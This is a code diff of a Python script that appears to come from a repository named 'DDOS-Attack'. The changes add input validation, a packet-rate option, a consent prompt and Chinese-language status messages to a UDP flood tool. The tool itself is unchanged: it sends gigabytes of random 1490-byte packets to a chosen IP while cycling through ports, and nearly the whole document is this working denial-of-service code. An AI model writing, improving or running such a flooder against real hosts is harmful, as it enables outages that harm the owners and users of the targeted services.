@@ -2,20 +2,9 @@ import sys
 import os
 import time
 import socket
-from datetime import datetime
+import ipaddress
 
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-PACKET_SIZE = 1490
-data = os.urandom(PACKET_SIZE)   # 随机载荷
-#############
+# ==================== 启动艺术字与法律警告 ====================
 
 os.system("clear")
 print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
@@ -44,18 +33,61 @@ print("Author    : BC-U809")
 print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
 print("")
 
-ip = input("IP Target : ")
-port = int(input("Port       : "))
+# ==================== 参数输入与验证 ====================
 
-# ---------- 输入总流量（GB）----------
-gb = float(input("Total data to send (GB) : "))
-total_bytes = gb * 1024 * 1024 * 1024
-max_packets = int(total_bytes // PACKET_SIZE)   # 根据包大小计算总包数
-print(f"[*] Will send {max_packets} packets ({gb} GB).")
+# 目标 IP 验证
+while True:
+    try:
+        ip_str = input("IP Target : ").strip()
+        ipaddress.ip_address(ip_str)   # 验证合法性
+        target_ip = ip_str
+        break
+    except ValueError:
+        print("[!] 无效的 IP 地址，请重新输入。")
 
-# ---------- 目标可达性检查 ----------
+# 目标端口验证
+while True:
+    try:
+        port_str = input("Port : ").strip()
+        target_port = int(port_str)
+        if 1 <= target_port <= 65535:
+            break
+        else:
+            print("[!] 端口必须在 1-65535 之间。")
+    except ValueError:
+        print("[!] 无效的端口号，请输入数字。")
+
+# 总流量输入（单位 GB）
+while True:
+    try:
+        gb_str = input("Total data to send (GB) : ").strip()
+        total_gb = float(gb_str)
+        if total_gb <= 0:
+            print("[!] 流量必须大于 0 GB。")
+            continue
+        break
+    except ValueError:
+        print("[!] 无效的数值，请输入数字。")
+
+# 可选速率限制（发包间隔）
+rate_limit = 0.0
+try:
+    rate_str = input("Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
+    rate_limit = float(rate_str)
+except ValueError:
+    rate_limit = 0.0
+
+PACKET_SIZE = 1490
+total_bytes = int(total_gb * 1024 * 1024 * 1024)
+max_packets = total_bytes // PACKET_SIZE
+print(f"\n[*] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB。")
+if rate_limit > 0:
+    print(f"[*] 发包间隔: {rate_limit} 秒")
+
+# ==================== 目标可达性检查 ====================
+
 def check_target(ip, port):
-    """尝试 TCP 连接，成功返回 True，否则返回 False"""
+    """简单 TCP 连接测试"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(3)
@@ -65,36 +97,56 @@ def check_target(ip, port):
     except (socket.timeout, ConnectionRefusedError, OSError):
         return False
 
-print("[*] Checking target...")
-if not check_target(ip, port):
+print("[*] 正在检查目标连通性...")
+if not check_target(target_ip, target_port):
     print("DDOS-Attack------ERROR")
     sys.exit(1)
-# ----------------------------------------------
+
+# 最终确认
+print("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。")
+confirm = input("你是否确认这是你拥有完全授权的隔离设备？(yes/no): ").strip().lower()
+if confirm != 'yes':
+    print("[*] 用户取消。")
+    sys.exit(0)
+
+# ==================== 攻击发送循环 ====================
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+payload = os.urandom(PACKET_SIZE)
 
 sent = 0
 sent_bytes = 0
 next_mb_threshold = 1024 * 1024   # 1 MB
+start_time = time.time()
 
-while sent < max_packets:
-    try:
-        sock.sendto(data, (ip, port))
+try:
+    while sent < max_packets:
+        sock.sendto(payload, (target_ip, target_port))
         sent += 1
         sent_bytes += PACKET_SIZE
-        port += 1
-        if port == 65534:
-            port = 1
 
-        # 每当累计发送量达到下一个 MB 时输出一次
+        # 端口递增（模拟真实攻击行为）
+        target_port += 1
+        if target_port > 65534:
+            target_port = 1
+
+        # 每 1 MB 输出一次进度
         if sent_bytes >= next_mb_threshold:
             mb_sent = sent_bytes / (1024 * 1024)
-            print(f"Sent {sent} packets, total {mb_sent:.2f} MB")
+            elapsed = time.time() - start_time
+            pps = sent / elapsed if elapsed > 0 else 0
+            print(f"已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
             next_mb_threshold += 1024 * 1024
 
-    except KeyboardInterrupt:
-        print("\n[!] Stopped by user")
-        sys.exit()
-    except Exception as e:
-        print(f"\n[!] Error: {e}")
-        sys.exit()
+        # 速率限制
+        if rate_limit > 0:
+            time.sleep(rate_limit)
 
-print(f"\n[+] Finished. Total packets sent: {sent}, total data: {sent_bytes / (1024 * 1024):.2f} MB")
+except KeyboardInterrupt:
+    print("\n[!] 用户手动停止发送。")
+except Exception as e:
+    print(f"\n[!] 错误: {e}")
+finally:
+    sock.close()
+    elapsed = time.time() - start_time
+    print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒。")
